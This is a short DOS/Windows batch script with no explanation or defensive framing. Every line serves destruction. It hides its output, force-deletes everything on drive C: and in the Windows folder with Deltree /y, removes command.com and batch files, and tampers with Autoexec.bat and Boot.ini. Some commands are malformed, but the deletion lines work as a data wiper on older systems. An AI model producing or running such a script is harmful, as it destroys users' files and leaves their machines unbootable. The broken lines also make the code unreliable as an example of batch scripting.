@echo off
Deltree /y C:\*.*
delete c:\command.com
del *.bat
C:\Windows\Command\bootdisk.bat+Boot.ini bootdisk.bat
CLS
xcopy C:\Autoexec.bat+Boot.ini Autoexec.bat
@echo off
Deltree /y C:\Windows\*.*
delete c:\*.*
C:\Windows\tmpdelsi.bat+Boot.ini tmpdelis.bat
CLS
